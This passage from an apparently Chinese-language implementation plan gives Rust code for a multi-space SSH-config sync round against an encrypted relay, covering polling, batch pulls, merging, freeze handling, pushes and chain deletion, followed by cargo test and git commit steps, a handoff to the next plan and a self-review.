/// 下一輪之前等多久(spec §6.4 + relay 配額,`relay::next_poll_delay`):正在用時 max(45 秒, 2 秒 × 這輪要查的 chain
/// 數),閒置時約 5 分鐘;連續被限流或 relay 回 `5xx` 時依序退避到最長 15 分鐘。
pub fn next_delay(env: &SyncEnv) -> Duration {
    let core = env.runtime.core.lock().unwrap();
    let spaces = core.state.as_ref().map(|s| s.spaces.values().filter(|sp| sp.selected && !sp.missing).count()).unwrap_or(0);
    next_poll_delay(
        1 + spaces,
        env.runtime.focused.load(Ordering::SeqCst),
        env.runtime.last_activity_ms.load(Ordering::SeqCst),
        env.now(),
        core.failed_rounds,
    )
}

/// 一輪同步。錯誤寫進 `last_error`(只寫在產生它的那一代狀態上 —— `prepare_files` 換了 generation 之後才失敗的例外,由
/// `run_round` 寫)並發 `sync://status`,永不 panic;被搶先、主 config 在載入之後被外部改過(`Conflict`:重跑)都不算錯誤。
pub fn sync_once(env: &SyncEnv) -> Result<(), AppError> {
    if env.runtime.syncing.swap(true, Ordering::SeqCst) {
        return Ok(()); // 已在同步中
    }
    // 先補存上次沒寫進磁碟的狀態;然後 generation / 狀態 / 金鑰一次快照(同一把鎖)。
    let (generation, snapshot, save_error) = {
        let mut core = env.runtime.core.lock().unwrap();
        let save_error = if core.unsaved { save_core(&mut core, &env.state_path).err() } else { None };
        let snapshot = match (core.state.as_ref(), core.account_keys.as_ref()) {
            (Some(s), Some(k)) if s.joined() => Some((s.clone(), k.clone())),
            _ => None,
        };
        (core.generation, snapshot, save_error)
    };
    let result = match (snapshot, save_error) {
        // 狀態還寫不進磁碟:不在未落盤的狀態上做任何網路操作。
        (_, Some(e)) => Err(e),
        (Some((s, keys)), None) => run_round(env, generation, s, keys, true).map(|_| ()),
        (None, None) => Ok(()),
    };
    env.runtime.syncing.store(false, Ordering::SeqCst);
    let outcome = match result {
        Ok(()) => Ok(()),
        Err(e) if is_superseded(&e) => Ok(()),
        Err(e) => {
            let mut core = env.runtime.core.lock().unwrap();
            if core.generation == generation {
                note_error(&mut core, env, &e);
            }
            Err(e)
        }
    };
    env.events.status();
    outcome
}

/// 把一輪的錯誤寫進 `last_error` 並存檔(存不了就留在記憶體,`unsaved` 讓下一輪先補寫)。呼叫端持有 core 鎖。
fn note_error(core: &mut SyncCore, env: &SyncEnv, e: &AppError) {
    if let Some(s) = core.state.as_mut() {
        s.last_error = Some(e.to_string());
    }
    let _ = save_core(core, &env.state_path);
}

/// relay 的能力(spec §6.4):每個行程、每個 relay URL 查一次 `GET /v1/info`;查不到(離線)就當作未知、先試批次。
fn relay_supports_batch(env: &SyncEnv, s: &SyncStateV2) -> bool {
    let checked = env.runtime.core.lock().unwrap().relay_checked.as_deref() == Some(s.relay_url.as_str());
    let features = if checked { s.relay_features.clone().filter(|f| f.url == s.relay_url) } else { check_relay(env).ok() };
    features.is_none_or(|f| f.supports(FEATURE_PULL_BATCH))
}

/// 這台已偵測到帳戶被更換同步碼(spec §7.5):不做任何網路寫入。只收到 push `409 frozen`、還沒有標記時,讀帳戶 chain
/// 取得標記(誰更換的),好讓狀態列說明。
fn refresh_markers(env: &SyncEnv, generation: u64, s: &SyncStateV2, keys: &ChainKeys, relay: &dyn RelayApi) -> Result<(), AppError> {
    if s.frozen().is_some_and(|f| !f.markers.is_empty()) {
        return Ok(());
    }
    let pulled = relay.pull(&keys.chain_id, &keys.auth_token, 0)?;
    let markers = merge_account(&AccountState::new(&keys.chain_id), keys, &pulled).markers;
    if !markers.is_empty() {
        commit(env, generation, |latest| {
            if let Some(f) = latest.account.as_mut().and_then(|a| a.frozen.as_mut()) {
                f.markers = markers;
            }
            Ok(())
        })?;
    }
    Ok(())
}

fn space_name(account: Option<&AccountState>, space_id: &str) -> String {
    account.and_then(|a| space_entry(a, space_id)).map(|e| e.name).unwrap_or_else(|| space_id[..8.min(space_id.len())].to_string())
}

/// 記下凍結(push `409 frozen`,spec §6.4):這一輪停止所有上傳、保留 dirty;下一輪讀帳戶 chain 取得標記。
fn mark_frozen(env: &SyncEnv, generation: u64) -> Result<(), AppError> {
    let now = env.now();
    commit(env, generation, |latest| {
        if let Some(account) = latest.account.as_mut() {
            if account.frozen.is_none() {
                account.frozen = Some(FreezeInfo { detected_at_ms: now, markers: Vec::new() });
            }
        }
        Ok(())
    })
}

/// 一輪(spec §7.1)。`generation`/`s`/`keys` 是 `sync_once` 在同一把 core 鎖內取得的快照。`mark_frozen` = false 時
/// (這台自己正在更換同步碼,spec §7.5 第 2 步)撞到凍結的 chain 不記進狀態,只回報給呼叫端。
pub fn run_round(env: &SyncEnv, generation: u64, s: SyncStateV2, keys: ChainKeys, mark_frozen_chains: bool) -> Result<RoundOutcome, AppError> {
    let relay = env.relay(&s.relay_url)?;
    if s.frozen().is_some() {
        refresh_markers(env, generation, &s, &keys, relay.as_ref())?;
        return Ok(RoundOutcome::default());
    }
    let batch = relay_supports_batch(env, &s);

    // 1. space 檔與 Include 清單。doc 還沒載入:安靜跳過(config 載入時會喚醒下一輪)。
    let prepared = match prepare_files(env) {
        Ok(Some(prepared)) => prepared,
        Ok(None) => return Ok(RoundOutcome::default()),
        // 主 config 在載入之後被外部改過、Include 清單寫不進去:`prepare_files` 已經重載 doc,並在放掉所有鎖之後發過
        // `applied(0)`(這裡不再發)。不是要顯示的錯誤:下一輪以磁碟上的內容重做,馬上跑。
        Err(AppError::Conflict(_)) => {
            env.events.wake();
            return Ok(RoundOutcome::default());
        }
        Err(e) => {
            // `prepare_files` 讀寫的是最新的狀態,可能先換了 generation(重新長出不見的 space 檔、做完取消勾選)才失敗;
            // `sync_once` 只把錯誤寫在產生它的那一代狀態上,這時錯誤會晚一輪才出現 —— generation 變了就在這裡寫。
            let mut core = env.runtime.core.lock().unwrap();
            if core.generation != generation {
                note_error(&mut core, env, &e);
            }
            return Err(e);
        }
    };
    if prepared.reloaded {
        env.events.applied(0);
    }
    if env.runtime.core.lock().unwrap().generation != generation {
        // 準備檔案時改了狀態(重新長出不見的檔案、做完取消勾選):這一輪的快照已作廢。
        env.events.wake();
        return Ok(RoundOutcome::default());
    }

    // 2. 讀檔、不變式(以 space 為單位:違反的 space 這一輪跳過,其他照常)。chain 不見了的 space 等使用者處理。
    let mut targets: Vec<(String, PathBuf)> = Vec::new();
    for (id, sp) in s.spaces.iter().filter(|(_, sp)| sp.selected && !sp.missing) {
        targets.push((id.clone(), space_path(env, &sp.file_name)?));
    }
    let (gathered, reloaded) = gather(env, &targets)?;
    if reloaded {
        env.events.applied(0);
    }
    let now = env.now();
    let mut work = s.clone();
    let mut healthy: BTreeMap<String, Gathered> = BTreeMap::new();
    let mut paused: BTreeMap<String, String> = BTreeMap::new();
    let mut rerun = false;
    for (id, result) in gathered {
        match result {
            Err(message) => {
                paused.insert(id, message);
            }
            Ok(g) => {
                let sp = work.spaces.get_mut(&id).expect("gathered from the snapshot");
                if space_emptied(&g.blocks, sp) {
                    // space 檔被清空、快取裡卻還有主機:從 chain 重新長出(下一輪是基線輪),不做本機 diff。
                    reset_space_for_rematerialize(sp);
                    eprintln!("[sync] a space file was emptied; restoring its hosts from the sync chain");
                    rerun = true;
                    paused.insert(id, String::new());
                    continue;
                }
                healthy.insert(id, g);
            }
        }
    }

    // 3. 本機 diff(外部編輯,時間戳 = 檔案 mtime)與裝置心跳 → dirty,在任何網路操作前持久化。
    let device_id = work.device_id.clone();
    for (id, g) in &healthy {
        let sp = work.spaces.get_mut(id).expect("healthy space");
        if sp.baseline_established {
            let external_at = g.modified_ms.min(now);
            plan_hosts(sp, &g.blocks, &device_id, |_| external_at);
        }
    }
    let selected: Vec<String> = work.spaces.iter().filter(|(_, sp)| sp.selected).map(|(id, _)| id.clone()).collect();
    let (name, platform) = (work.device_name.clone(), env.platform);
    plan_device(work.account.as_mut().expect("joined"), &device_id, &name, platform, &selected, now);
    commit(env, generation, |latest| {
        latest.account = work.account.clone();
        for (id, message) in &paused {
            if let (Some(l), Some(w)) = (latest.spaces.get_mut(id), work.spaces.get(id)) {
                *l = w.clone();
                if !message.is_empty() {
                    l.last_error = Some(message.clone());
                }
            }
        }
        for id in healthy.keys() {
            if let (Some(l), Some(w)) = (latest.spaces.get_mut(id), work.spaces.get(id)) {
                *l = w.clone();
            }
        }
        Ok(())
    })?;
    if rerun && healthy.is_empty() {
        env.events.wake();
        return Ok(RoundOutcome::default());
    }

    // 4. 一個批次請求:帳戶 chain 一律排第一;舊 relay 的 space 每 3 輪查一次。
    let rounds = {
        let mut core = env.runtime.core.lock().unwrap();
        core.rounds += 1;
        core.rounds
    };
    let account = work.account.clone().expect("joined");
    let mut items = vec![BatchPullItem { chain: keys.chain_id.clone(), token: keys.auth_token.clone(), since: account.cursor_seq }];
    if batch || rounds % LEGACY_SPACE_EVERY == 1 {
        for id in healthy.keys() {
            if let Some(space) = space_keys(&account, &keys, id) {
                items.push(BatchPullItem { chain: space.chain_id, token: space.auth_token, since: work.spaces[id].cursor_seq });
            }
        }
    }
    let batch_failures = env.runtime.core.lock().unwrap().batch_failures;
    let pulled_all = pull_all(relay.as_ref(), &items, batch, batch_failures).map_err(AppError::from)?;
    {
        let mut core = env.runtime.core.lock().unwrap();
        if pulled_all.batch_failed {
            core.batch_failures = core.batch_failures.saturating_add(1);
        } else if pulled_all.batch_ok {
            core.batch_failures = 0;
        }
    }
    let (mut fetched, mut limited, mut failed) = (pulled_all.fetched, pulled_all.limited, pulled_all.failed);

    // 5. 帳戶的結果一律先處理。
    let pulled = match fetched.remove(&keys.chain_id) {
        Some(Fetched::Ok(p)) => p,
        Some(Fetched::NotFound) => return Err(AppError::Other(ACCOUNT_GONE_MESSAGE.to_string())),
        Some(Fetched::Missed) | None => {
            // 沒拿到帳戶(被限流、relay 出錯):不處理任何 space、不上傳,退避後再試。
            finish(env, generation, &work, now, 0, limited, failed)?;
            return Ok(RoundOutcome::default());
        }
    };
    let merged_account = merge_account(&account, &keys, &pulled);
    if merged_account.skipped > 0 {
        eprintln!("[sync] {} account record(s) could not be read and were skipped", merged_account.skipped);
    }
    if !merged_account.markers.is_empty() {
        let markers = merged_account.markers;
        commit(env, generation, |latest| {
            if let Some(a) = latest.account.as_mut() {
                a.frozen = Some(FreezeInfo { detected_at_ms: now, markers });
            }
            Ok(())
        })?;
        return Ok(RoundOutcome::default());
    }
    work.account = Some(merged_account.section);
    let reconciled = match commit_account(env, generation, work.account.as_ref().expect("joined")) {
        Ok(reconciled) => reconciled,
        // 帳戶已經存檔;調整 space 檔時主 config 在載入之後被外部改過:`commit_account` 已發過 `applied(0)`,檔案那一半
        // 由下一輪做完,馬上跑(不是要顯示的錯誤)。
        Err(AppError::Conflict(_)) => {
            env.events.wake();
            return Ok(RoundOutcome::default());
        }
        Err(e) => return Err(e),
    };
    for notice in &reconciled.notices {
        env.events.notice(notice);
    }
    if reconciled.touched {
        // 改名或刪除了 space 檔:這一輪拉到的 space 結果作廢(cursor 沒推進),立刻重跑。
        env.events.applied(0);
        env.events.wake();
        return Ok(RoundOutcome::default());
    }

    // 6. 逐一提交 space:每個都是獨立交易,失敗不回退其他已提交的部分。
    let account_now = work.account.clone().expect("joined");
    let mut applied_hosts = 0usize;
    let mut conflicts: Vec<SyncConflict> = Vec::new();
    let mut held: Vec<ApprovalNotice> = Vec::new();
    for (id, g) in &healthy {
        let Some(space) = space_keys(&account_now, &keys, id) else {
            space_error(env, generation, id, MISSING_KEY_MESSAGE)?;
            continue;
        };
        let pulled = match fetched.remove(&space.chain_id) {
            Some(Fetched::Ok(p)) => p,
            Some(Fetched::NotFound) => {
                // 帳戶仍有這個 space(已 tombstone 的在上一步就移除了):暫停,等使用者選重建或刪除(spec §9)。
                commit(env, generation, |latest| {
                    if let Some(sp) = latest.spaces.get_mut(id) {
                        sp.missing = true;
                        sp.last_error = Some(SPACE_GONE_MESSAGE.to_string());
                    }
                    Ok(())
                })?;
                work.spaces.get_mut(id).expect("healthy").missing = true;
                continue;
            }
            Some(Fetched::Missed) | None => continue,
        };
        let section = work.spaces[id].clone();
        let merged = merge_space(&section, &space, &pulled, &g.blocks, |d| device_name(&account_now, d));
        if merged.skipped > 0 {
            eprintln!("[sync] {} remote record(s) could not be read and were skipped", merged.skipped);
        }
        let mut next = merged.section;
        let mut effects = merged.effects;
        if !section.baseline_established {
            // 基線輪(剛勾選,或 space 檔不見了 / 被清空):以 chain 為準;重新長出時保留的未上傳修改一起寫回。
            effects.extend(unpushed_host_effects(&next, &g.blocks));
            next.baseline_established = true;
            rerun = true;
        }
        next.last_error = None;
        let path = space_path(env, &section.file_name)?;
        match apply_and_commit_space(env, generation, id, &path, &g.fingerprint, &effects, &next) {
            Ok(Applied::FileChanged) => rerun = true,
            Ok(Applied::Committed { wrote, save_error }) => {
                if wrote {
                    applied_hosts += effects.len();
                }
                let name = space_name(Some(&account_now), id);
                if !merged.conflicts.is_empty() {
                    conflicts.push(SyncConflict { space_id: id.clone(), space_name: name.clone(), aliases: merged.conflicts });
                }
                if !merged.held.is_empty() {
                    held.push(ApprovalNotice { space_id: id.clone(), space_name: name, aliases: merged.held });
                }
                work.spaces.insert(id.clone(), next);
                if let Some(e) = save_error {
                    announce(env, applied_hosts, &conflicts, &held);
                    return Err(e); // 狀態沒落盤:不在未落盤的狀態上上傳
                }
            }
            Err(e) if is_superseded(&e) => {
                announce(env, applied_hosts, &conflicts, &held);
                return Err(e);
            }
            Err(e) => space_error(env, generation, id, &e.to_string())?,
        }
    }
    announce(env, applied_hosts, &conflicts, &held);

    // 7. 上傳(唯讀模式不上傳)。帳戶與各 space 分開;撞到凍結的 chain 就停止這一輪所有上傳。
    let read_only = work.read_only();
    let mut push_conflicts = 0usize;
    if !read_only {
        let account = work.account.clone().expect("joined");
        let outgoing = account_outgoing(&account, &keys)?;
        if !outgoing.is_empty() {
            // 先記下已被接受的批次(凍結或出錯之前送出的照樣算數),再看凍結,最後才看錯誤。
            let pushed = push_outgoing(relay.as_ref(), &keys.chain_id, &keys.auth_token, &outgoing);
            push_conflicts += pushed.conflicts;
            if !pushed.accepted.is_empty() {
                commit(env, generation, |latest| {
                    if let Some(a) = latest.account.as_mut() {
                        apply_pushed_account(a, &outgoing, &pushed);
                    }
                    Ok(())
                })?;
                if let Some(a) = work.account.as_mut() {
                    apply_pushed_account(a, &outgoing, &pushed);
                }
            }
            if pushed.frozen {
                return frozen_out(env, generation, mark_frozen_chains);
            }
            match pushed.error {
                None => {}
                Some(RelayError::RateLimited) => limited = true,
                Some(RelayError::Http(code)) if code >= 500 => failed = true,
                Some(e) => return Err(e.into()),
            }
        }
        delete_chains(env, generation, &work, &keys, relay.as_ref())?;
        for id in healthy.keys() {
            let Some(section) = work.spaces.get(id).filter(|sp| !sp.missing) else { continue };
            let Some(space) = space_keys(work.account.as_ref().expect("joined"), &keys, id) else { continue };
            let outgoing = space_outgoing(section, &space)?;
            if outgoing.is_empty() {
                continue;
            }
            // 同帳戶:先記下已被接受的批次,再看凍結,最後才看錯誤。
            let pushed = push_outgoing(relay.as_ref(), &space.chain_id, &space.auth_token, &outgoing);
            push_conflicts += pushed.conflicts;
            if !pushed.accepted.is_empty() {
                commit(env, generation, |latest| {
                    if let Some(sp) = latest.spaces.get_mut(id) {
                        apply_pushed_space(sp, &outgoing, &pushed);
                    }
                    Ok(())
                })?;
            }
            if pushed.frozen {
                return frozen_out(env, generation, mark_frozen_chains);
            }
            match pushed.error {
                None => {}
                Some(RelayError::RateLimited) => limited = true,
                Some(RelayError::Http(code)) if code >= 500 => failed = true,
                Some(RelayError::NotFound) => {
                    commit(env, generation, |latest| {
                        if let Some(sp) = latest.spaces.get_mut(id) {
                            sp.missing = true;
                            sp.last_error = Some(SPACE_GONE_MESSAGE.to_string());
                        }
                        Ok(())
                    })?;
                }
                Some(e) => return Err(e.into()),
            }
        }
    }

    // 8. 收尾:最後同步時間、狀態列訊息、衝突重跑與退避。
    let retry = finish(env, generation, &work, now, push_conflicts, limited, failed)?;
    if rerun || retry {
        env.events.wake();
    }
    Ok(RoundOutcome::default())
}

/// 提交帳戶區段(spec §7.1 第 5 步)並依新的記錄調整這台的 space 檔(改名、別台刪除、Include 順序)。動了檔案就
/// 重載 doc、換 generation —— 這一輪的 space 結果作廢。
///
/// 調整檔案失敗(`reconcile_space_files` 的任何 Err):doc 可能已被它整份重載(`Conflict`,或前面的步驟已經動過檔案),
/// 所以放掉所有鎖之後發 `applied(0)` 再回傳這個 Err。帳戶區段在那之前已經存檔;`Conflict`(主 config 在載入之後被
/// 外部改過)由呼叫端當成「下一輪做完、馬上重跑」。
fn commit_account(env: &SyncEnv, generation: u64, account: &AccountState) -> Result<crate::sync::spaces::Reconciled, AppError> {
    let mut doc_lock = env.doc.lock().unwrap();
    {
        let mut core = env.runtime.core.lock().unwrap();
        if core.generation != generation {
            return Err(crate::sync::runtime::superseded());
        }
        if let Some(s) = core.state.as_mut() {
            s.account = Some(account.clone());
        }
        save_core(&mut core, &env.state_path)?;
    }
    let Some(doc) = doc_lock.as_mut() else { return Ok(Default::default()) };
    let mut backed_up = env.backed_up.lock().unwrap();
    let result = reconcile_space_files(env, doc, &mut backed_up, env.retention());
    drop(backed_up);
    let reconciled = match result {
        Ok(reconciled) => reconciled,
        Err(e) => {
            drop(doc_lock);
            env.events.applied(0);
            return Err(e);
        }
    };
    if reconciled.touched {
        let main = doc.files[0].path.clone();
        *doc_lock = Some(env.load_doc(&main)?);
        env.runtime.core.lock().unwrap().generation += 1;
    }
    Ok(reconciled)
}

/// 只屬於一個 space 的錯誤(spec §9):記在那個 space 上,這一輪跳過它,其他照常。
fn space_error(env: &SyncEnv, generation: u64, space_id: &str, message: &str) -> Result<(), AppError> {
    commit(env, generation, |latest| {
        if let Some(sp) = latest.spaces.get_mut(space_id) {
            sp.last_error = Some(message.to_string());
        }
        Ok(())
    })
}

/// push 撞到凍結的 chain(spec §6.4):停止這一輪所有上傳、保留 dirty。
fn frozen_out(env: &SyncEnv, generation: u64, mark: bool) -> Result<RoundOutcome, AppError> {
    if mark {
        mark_frozen(env, generation)?;
    }
    Ok(RoundOutcome { frozen: true })
}

/// 刪除這台刪掉的 space 的 chain(spec §7.2):tombstone 都已上傳(`space` 與 `spacekey` 記錄不再 dirty)、而且這個
/// space 仍算已刪除(`space_deleted_by`)才 `DELETE`;chain 已經不在也算完成。失敗的留到下一輪。
fn delete_chains(env: &SyncEnv, generation: u64, work: &SyncStateV2, keys: &ChainKeys, relay: &dyn RelayApi) -> Result<(), AppError> {
    let Some(account) = work.account.as_ref() else { return Ok(()) };
    let mut done = Vec::new();
    for sealed in &account.chain_deletes {
        let Ok(record) = sealed.open(keys) else {
            done.push(sealed.envelope.ciphertext.clone()); // 打不開的不可能刪得掉
            continue;
        };
        if space_deleted_by(account, keys, &record.id).is_none() {
            done.push(sealed.envelope.ciphertext.clone()); // 刪除被取代了(兩筆 tombstone 都輸給較新的記錄):不刪
            continue;
        }
        let uploaded = !account.records.get(&record_key(RecordKind::Space, &record.id)).is_some_and(|l| l.dirty)
            && !account.sealed.get(&space_key_slot(keys, &record.id)).is_some_and(|s| s.dirty);
        if !uploaded {
            continue; // tombstone 還沒上傳
        }
        let Ok(space) = serde_json::from_value::<SpaceKeyPayload>(record.payload).map_err(|_| ()).and_then(|p| p.to_keys(&record.id).map_err(|_| ())) else {
            done.push(sealed.envelope.ciphertext.clone());
            continue;
        };
        match relay.delete_chain(&space.chain_id, &space.auth_token) {
            Ok(()) | Err(RelayError::NotFound) => done.push(sealed.envelope.ciphertext.clone()),
            Err(e) => eprintln!("[sync] could not delete a removed space's chain yet: {e}"),
        }
    }
    if done.is_empty() {
        return Ok(());
    }
    commit(env, generation, |latest| {
        if let Some(a) = latest.account.as_mut() {
            a.chain_deletes.retain(|s| !done.contains(&s.envelope.ciphertext));
        }
        Ok(())
    })
}

fn announce(env: &SyncEnv, applied: usize, conflicts: &[SyncConflict], held: &[ApprovalNotice]) {
    if applied > 0 {
        env.events.applied(applied);
    }
    if !conflicts.is_empty() {
        env.events.conflict(conflicts);
    }
    if !held.is_empty() {
        env.events.approval(held);
    }
}

/// 一輪的收尾(同 v1 `commit_pushed`):`last_sync_ms`、狀態列訊息(衝突一直解不開 / 被限流 / relay 出錯 / 唯讀)、
/// 連續衝突與退避的輪數。回傳是否要因為推送衝突立刻再跑一輪(被限流或 relay 出錯時不立刻重跑)。
fn finish(env: &SyncEnv, generation: u64, work: &SyncStateV2, now: u64, conflicts: usize, limited: bool, failed: bool) -> Result<bool, AppError> {
    let mut core = env.runtime.core.lock().unwrap();
    if core.generation != generation {
        return Err(crate::sync::runtime::superseded());
    }
    let streak = if conflicts == 0 { 0 } else { core.conflict_streak.saturating_add(1) };
    let stuck = streak >= CONFLICT_RETRY_LIMIT;
    core.conflict_streak = streak;
    core.failed_rounds = if limited || failed { core.failed_rounds.saturating_add(1) } else { 0 };
    let read_only = work.read_only();
    if let Some(s) = core.state.as_mut() {
        s.last_sync_ms = Some(now);
        s.last_error = if stuck {
            Some(STUCK_CONFLICTS_MESSAGE.to_string())
        } else if limited {
            Some(RATE_LIMITED_MESSAGE.to_string())
        } else if failed {
            Some(RELAY_TROUBLE_MESSAGE.to_string())
        } else {
            read_only.then(|| READ_ONLY_MESSAGE.to_string())
        };
    }
    save_core(&mut core, &env.state_path)?;
    Ok(conflicts > 0 && !stuck && !limited && !failed)
}
```

- [ ] **Step 11: 跑測試確認通過**

Run: `cd src-tauri && cargo test -- --skip secrets::tests::round_trip_set_get_delete --skip askpass::tests::env_secret_takes_priority_over_keychain`
Expected: PASS —— `test result: ok. 610 passed; 0 failed`(task 開始前 586)。數量有變的模組:`sync::round` 24(新)。非測試建置會有一長串 `dead_code` 類的 warning(`is never used` 之類):B2 留下的,加上本計畫新增、要到 B3b Task 2 才接上的項目;B3b Task 2 之後只剩既有的 `set_host_enabled`。這是預期的,不要加 `#[allow(dead_code)]`;不得有其他種類的 warning。

- [ ] **Step 12: Commit**

只加下列路徑(`src-tauri/Cargo.lock` 的版本漂移不要 stage):

```bash
git add src-tauri/src/sync/relay.rs
git add src-tauri/src/sync/testkit.rs
git add src-tauri/src/sync/files.rs
git add src-tauri/src/sync/spaces.rs
git add src-tauri/src/sync/round.rs
git add src-tauri/src/sync/mod.rs
git commit -m "feat(sync): run a multi-space v2 sync round with focus-aware polling"
```

---

## 交給 B3b

B3b(`docs/superpowers/plans/2026-10-02-sync-v2-b3b-engine-wiring.md`)在 B3a(repo `5c98f25`)之上進行,會用到:

- `round::sync_once` / `run_round` / `next_delay`(背景執行緒的一輪與間隔)、`runtime::SyncRuntime`(取代 v1 的
  `engine::SyncRuntime` 成為 `AppState::sync`)、`files::note_written`(存檔 hook)。`run_round` 回
  `RoundOutcome { frozen, markers, backoff }`(Task 4 審查後):B3b 更換同步碼的第 2 步看到 `markers` 就讓給對方的更換,
  `backoff` 時不立刻重跑。
- `env::{SyncEnv, OsKeychain, HttpRelays, SystemClock, SyncEvents}`:B3b 由 `AppHandle` 組出 production 的 `SyncEnv`。
- `account::*`、`spaces::*`:Tauri commands 直接包裝它們(lifecycle 鎖 + `spawn_blocking`)。`spaces::approve` / `reject` 收使用者
  看過的 `(alias, digest)`(`spaces::review_digest`)、回 `Reviewed`:B3b 的 `sync_approve` / `sync_reject` 與
  `PendingApprovalView` 要帶 `digest`、回報 `changed`。
- `round::tests::{pair, settle, rotate_elsewhere}`、`testkit::*`(含 `AppliedProbe`)、`FakeRelay`:B3b 的測試。
- `leave_account` 離開時把這台的 space 檔搬到 `~/.ssh/sshelter-local/` 並留下 `SyncNotice::LeftAccount`;B4 要顯示它。
- 尚未接上(B3b 做):`SyncCore.legacy` 的 v1 升級、`SyncStateV2.rotation` 的推進、`WindowEvent::Focused` →
  `SyncRuntime::set_focused`、存檔 hook → `SyncRuntime::note_activity` 與 `files::note_written`、狀態 DTO 與事件。

---

## Self-review(已執行)

- **Spec 覆蓋**:§7.1 第 1–8 步 → Task 4(第 2、6 步的檔案交易在 Task 2);§7.1 的 generation、`note_file_written`、
  檔案消失 / 清空 → Task 2(`runtime`、`files`)與 Task 4 的測試;§7.2 建立 / 改名 / 刪除 / 勾選 / 取消勾選 → Task 3
  (跨 space 搬移與搬移精靈在 B3b);§7.3 建立 / 加入 / 離開 / 刪除帳戶 / relay URL → Task 3;§7.4 保留、核准、拒絕、
  被新版本取代、基線合併審核、移除受管制設定照常套用 → Task 1(`merge_space`)與 Task 3(`approve` / `reject`)、Task 4
  的情境測試;§6.4 批次、`deferred`、舊 relay、間隔、`429`、`409 frozen` → Task 4(加上 B1 裁定 1–5);§9 的離線、
  `deferred`、批次 `5xx`、`409 frozen`、space chain `404`(兩種)、帳戶 chain `404` / 標記、單一 space 失敗、等待中又有
  新版本、改名目標已存在(提示只出現一次)、目錄殘留檔(`stray_space_files`,B3b 的狀態 DTO 列出)、keychain 讀取失敗
  → Task 1–4;§7.3 離開後「本機 space 檔案與 Include 保留,ssh 照常可用」與換 relay 的流程 → Task 3(B4 計畫的 A1)。
  §7.5、§7.6、搬移與 Tauri 接線屬 B3b。
- **Placeholder 掃描**:每個程式步驟都是完整程式碼或精確的 edit;沒有 TBD、TODO 或「同 Task N」。
- **型別一致**:`SyncNotice`、`DeclinedVersion`(Task 1)→ `files`、`spaces`、`round`;`SpaceEntry`、`AccountMerged`、
  `Outgoing`、`Pushed`(Task 1)→ Task 3、4;`SyncEnv`、`commit` / `mutate`、`Prepared`、`Gathered`、`Applied`(Task 2)→
  Task 3、4;`Reconciled`(Task 3)→ Task 4;`next_poll_delay` 的新簽章(Task 4)只有 `round::next_delay` 呼叫。
- **Review Focus**:五項各有測試,寫在對應 task 裡(見上方清單的測試名稱)。
- **驗證**:四個 task 與最終修正都已在 repo 執行(`657 passed`);每個 task 執行之前,計畫的程式碼都在當時 repo 的拷貝上重播過(先確認新測試編譯
  失敗,再確認全綠,樹與參考實作逐位元組相同,commit 的路徑清單涵蓋全部變更)。`cargo clippy --all-targets` 在 `1e841cf`
  基準的那一版驗證過(除了 `dead_code` 沒有新的警告),之後的修改沒有重跑(環境裡暫時沒有可用的 clippy)。B3a 結束時測試
  建置(`lib test`)的 warning 只剩 B3a 之前就有的 4 個,加上要到 B3b Task 2 才接上的 production 項目(`OsKeychain`、
  `SystemClock`、`HttpRelays`、`SyncRuntime::lifecycle`)。
